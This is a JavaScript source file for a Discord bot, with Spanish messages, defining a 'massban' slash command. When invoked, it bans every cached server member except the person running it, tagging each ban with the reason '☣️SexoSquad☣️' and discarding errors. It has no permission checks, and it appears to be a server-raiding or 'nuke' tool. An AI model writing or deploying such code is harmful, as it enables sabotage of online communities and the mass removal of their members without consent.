const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {

    timeout:60000, 
    data: new SlashCommandBuilder()
    .setName("massban")
    .setDescription("Banea a gran parte del servidor. "),

    async run(client, interaction){
try{

  interaction.reply({content: '**Iniciando Massmute en este server, solo podré banear a usuarios inferiores a mi rol.**', ephemeral: true})

  interaction.guild.members.cache.forEach(member => {
    if(member.user.id == interaction.user.id){
      return;
    }else{
      member.ban({reason: '☣️SexoSquad☣️'}).catch(e=>{ 
       return;
      })
    }

  })
    
  
  

}catch (e) {
        console.error(e);
       
        try {
          return;
         } catch (e) {}
        }
    }
}
